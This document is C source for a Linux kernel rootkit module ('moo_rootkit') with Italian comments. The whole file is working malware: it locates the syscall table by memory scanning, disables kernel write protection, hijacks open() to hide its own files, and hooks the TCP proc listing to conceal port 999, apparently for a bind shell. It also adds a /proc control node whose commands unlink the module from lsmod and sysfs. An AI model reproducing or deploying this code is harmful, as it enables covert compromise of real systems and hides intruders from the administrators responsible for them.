/* Tested on Linux Debian 6 - Kernel 2.6.32-5-686 (32bit) e con GCC 4.4.5 */


#include <linux/module.h>
#include <linux/string.h>
#include <linux/init.h> /*static in __init, static int __exit*/
#include <linux/kernel.h>
#include <linux/unistd.h> /* NR_xxxx offset for syscall */
#include <linux/syscalls.h>
#include <linux/proc_fs.h> /* proc, proc_create ecc..*/
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/kobject.h>
#include <asm/uaccess.h> /* copy_from_user */
#include <asm/processor-flags.h> /* #define X86_CR0_WP      0x00010000  Write Protect */
#include <net/tcp.h> /*hijacking tcp4_seq_show */
#include <asm-generic/errno-base.h> /*return -ENOENT*/

/*boole in C */
#define TRUE 1
#define FALSE 0

#define ROOTKIT "moo_rootkit"
#define BINDSHELL "moo_bindshell"

/* */
#define PORT_TO_HIDE 999

/* check 32 or 64 bit */
//#if defined(__i386__)
/* on 32 bit arch kernel memory starts from 0xc0000000 to 0xd0000000 */
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000
typedef unsigned int memptr;
typedef int alink;
 /* on 32 bit arch kernel memory starts from 0xffffffff81000000 to 0xffffffffa2000000 */
/*
#else
#define START_MEM 0xffffffff81000000
#define END_MEM 0xffffffffa2000000
typedef unsigned long memptr;
typedef long alink;
#endif */
#define __DEBUG__ TRUE
/* macro for debug messages
http://www.swig.org/Doc1.3/Preprocessor.html */
#if __DEBUG__
# define DEBUG(fmt, ...) printk(KERN_INFO fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif

/* Bypass protected mode. We use CR0 cpu register to disable protected mode and remove write protection*/

#define WP_ON write_cr0(read_cr0() | 0x00010000) /* bitwise & (AND), ~ (NOT)  NOT on cr0 (0x00010000) set to CR0=0*/
#define WP_OFF write_cr0(read_cr0() & (~ 0x00010000)) /* bitwise | (OR) Restore CR0=1*/


/* Orignal syscall prototype */
asmlinkage ssize_t (*o_open)(const char __user *, int, umode_t);
asmlinkage ssize_t (*o_read) (unsigned int, char __user *, size_t);

/* From linux kernel 2.6, sys call tables aren’t directly accessible using “extern void *sys_call_table[]” but we will use a trick. Because they are still in memory, we can search the addresses. It can be done statically searching the System.map file and find sys call address (or with /proc/kallsysms for kernel > 3.1.x) or we can search in memory. */

static memptr **sys_call_table; /* to store syscall pointer */
static memptr **find_sys_t(void);
char *strnstr(const char *haystack, const char *needle, size_t n);

/* Hijacked syscall prototype */
asmlinkage ssize_t fake_read(unsigned int fd, char __user *buf, size_t count);
asmlinkage ssize_t fake_open(const char __user *filename, int flags, umode_t mode);

/* original tcp4_seq_show prototype */
static int (*o_tcp4_seq_show)(struct seq_file *seq, void *v);
/* net/ipv4/tcp_ipv4.c */
#define TMPSZ 150 //sequence_file dim
/*hijacked tcp4_seq_show prototype*/
static int hook_tcp4_seq_show(struct seq_file *seq, void *v);

/*Empty list for restore */
static struct list_head *saved_mod_list_head;
struct kobject *saved_kobj_parent;


/* proc file configuration specifics */
#define PROCFS_MAX_SIZE 1024
#define PROCFS_NAME "mooooo"
#define HIDE "nasconditi"
#define SHOW "mostra"
/*node info*/
static struct proc_dir_entry *moo_rootkit_proc_file;
/*buffer to save strings*/
static char procfs_buffer[PROCFS_MAX_SIZE];

static unsigned long procfs_buffer_size = 0;

/*procfile_read(): read on proc file
profile_write(): usefull to pass the command to the rootkit. */
int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data);
int procfile_write(struct file *file, const char *buffer, unsigned long count, void *data);

/* copy_from_user() http://www.fsl.cs.sunysb.edu/kernel-api/re257.html
http://www.ibm.com/developerworks/linux/library/l-kernel-memory-access/index.html*/

void nascondi_modulo(void);
void mostra_modulo(void);

static int __init ROOTKIT_init(void) {

	DEBUG ("m00_rootkit all'attacco!\n");

	/*Save list addresses for restoring */
	saved_mod_list_head = THIS_MODULE->list.prev;
	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;

	/*pointer to syscall.. */
	sys_call_table = (memptr **) find_sys_t();
	if ( sys_call_table != NULL ) {
		DEBUG("Syscall trovata !\n");
    } else {
    	DEBUG("Syscall non trovata\n");
    	return -EPERM;
    }

	struct tcp_seq_afinfo *my_afinfo = NULL;

	/*proc_net removed on 2.6.32, use init_net.proc_net*/
	struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
	while(strcmp(my_dir_entry->name, "tcp")){
   	my_dir_entry = my_dir_entry->next;
   }
   if( (my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data) ) {
   //seq_show no 2.6.32, use seq_ops.show
   	o_tcp4_seq_show = my_afinfo->seq_ops.show;
   	my_afinfo->seq_ops.show = hook_tcp4_seq_show;
   }
    WP_OFF; /*write protected mode off*/


	DEBUG("syscall hijacking\n");
	/* Save orignale syscall*/
	o_open = (void *)sys_call_table[__NR_open];
	o_read = (void *)sys_call_table[__NR_read];

   /* syscall hijacking */
   sys_call_table[__NR_open] = (memptr *) fake_open;
   sys_call_table[__NR_read] = (memptr *) fake_read;
	/*xchg() si può fare anche con xchg
	o_write = (void *) xchg(&sys_call_table[__NR_open],fake_open);
	o_read = (void *) xchg(&sys_call_table[__NR_read],fake_read);*/

	WP_ON; /*write protected mode on*/

	/*Make /proc node */
	moo_rootkit_proc_file = create_proc_entry(PROCFS_NAME, 0666, NULL);
	if (moo_rootkit_proc_file == NULL)
	{
		DEBUG("Impossibile creare il nodo %s su /proc",PROCFS_NAME);
		remove_proc_entry(PROCFS_NAME, NULL);
		return -ENOMEM;
	}
	moo_rootkit_proc_file->read_proc  = procfile_read;
	moo_rootkit_proc_file->write_proc = procfile_write;
	moo_rootkit_proc_file->uid = 0;
	moo_rootkit_proc_file->gid = 0;
	DEBUG("Creato il nodo %s su /proc",PROCFS_NAME);
	return 0;
}

/*hide ports */
static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval =o_tcp4_seq_show(seq, v);
        char port[12];

        sprintf(port, ":%04X", PORT_TO_HIDE);

        if(strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
                seq->count -= TMPSZ;
            }
		return retval;
}

/* find_sys_t() search for syscall address */
static memptr **find_sys_t() {
	memptr **sctable;
	memptr i = START_MEM;
	while ( i < END_MEM) {
		sctable = (memptr **)i;
		if ( sctable[__NR_close] == (memptr *) sys_close ) { /* __NR_close  defined in unistd.h */
			return &sctable[0];
		}
		i += sizeof(void *); /* only for gcc !!!!*/
	}
	return NULL;
}

char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s - haystack + strlen(needle) <= n)
		return s;
	else
		return NULL;
}
/*error you try to open "protected file"  */
asmlinkage ssize_t fake_open(const char __user *filename, int flags, umode_t mode) {
 int r = 0;
 char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
 if (kbuff == NULL)
 {
 	DEBUG("Impossibile allocare spazio per fake_open");
 }
 else {
	copy_from_user(kbuff,filename,255);
 	if (strstr(kbuff,ROOTKIT) != NULL) {
 		kfree(kbuff);
 		return -ENOENT;
 	}
 	else {
 		kfree(kbuff);
 		r = (*o_open)(filename,flags,mode);
 		return r;
 	}
 }
}
/* */
asmlinkage ssize_t fake_read(unsigned int fd, char __user *buff, size_t count) {
	int r = 0;

	r = (*o_read)(fd,buff,count);
	return r;
}
/* when you try to read proc/PROCFS_NAME ..*/
int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data)
{
	printk(KERN_DEBUG "No no no!\n");
	return 0;
}

/* echo %COMMAND% > /proc/%PROCFS% */

int procfile_write(struct file *file, const char *buffer, unsigned long count, void *data){
	char *cmd_hide = HIDE;
	char *cmd_show = SHOW;

	procfs_buffer_size = count;
	if(procfs_buffer_size > PROCFS_MAX_SIZE)
	{
		procfs_buffer_size = PROCFS_MAX_SIZE;
	}

	if(copy_from_user(procfs_buffer, buffer, procfs_buffer_size))
	{
		return -EFAULT;
	}
	/*commands*/
	if (!strncmp(cmd_hide,procfs_buffer,strlen(cmd_hide)))
	{
		nascondi_modulo();
		return procfs_buffer_size;
	}
	else if (!strncmp(cmd_show,procfs_buffer,strlen(cmd_show)))
	{
		mostra_modulo();
		return procfs_buffer_size;
	}
	return procfs_buffer_size;

}

void nascondi_modulo(){

	/* Linux kernel save module list on a linked list in memory . ‘lsmod’ reads from that. We force to cleanup the linked list */
	list_del_init(&__this_module.list);
	DEBUG ("Bye bye /proc/modules..\n");

	/*the module remains visible on /sys/module/MODULE_NAME.
	We will use 'void kobject_del(ko)' to remove the module from the list */

	kobject_del(&THIS_MODULE->mkobj.kobj);
	DEBUG ("Bye bye /sys/module/..\n");

	/* clean kallsyms  otherwise -> "sysfs group not found for kobject " we you unmount the module with rmmod*/
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;

	/* the functions above make unusable modprobe, lsmod, rmmod, insmod.. :)).. but we can do better */

}

void mostra_modulo(){
	DEBUG ("Ripristino le liste per lsmod e /proc\n");

	list_add(&THIS_MODULE->list, saved_mod_list_head);

	DEBUG ("Ripristino kobject per /sys/module/..\n");

	kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, THIS_MODULE->name);
}
static void __exit ROOTKIT_exit(void){

	WP_OFF;
	DEBUG("Rimetto tutto a post \nBye bye..\n");
	/*Restoring syscalls..*/
	sys_call_table[__NR_open] = (memptr *) o_open;
	sys_call_table[__NR_read] = (memptr *) o_read;
	/* it can be done event with
	xchg(&sys_call_table[__NR_open],o_open);
	xchg(&sys_call_table[__NR_read],o_read);*/

	remove_proc_entry(PROCFS_NAME, NULL);

	/*restoring struct*/
	struct tcp_seq_afinfo *my_afinfo = NULL;
	struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
	while(strcmp(my_dir_entry->name, "tcp")){
		my_dir_entry = my_dir_entry->next;
	}
	if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
	{
		my_afinfo->seq_ops.show=o_tcp4_seq_show;
	}
	WP_ON;
}

module_init(ROOTKIT_init); /* modulo init */
module_exit(ROOTKIT_exit); /* cleanup linux/init.h linea 250 */

MODULE_LICENSE("GPL");
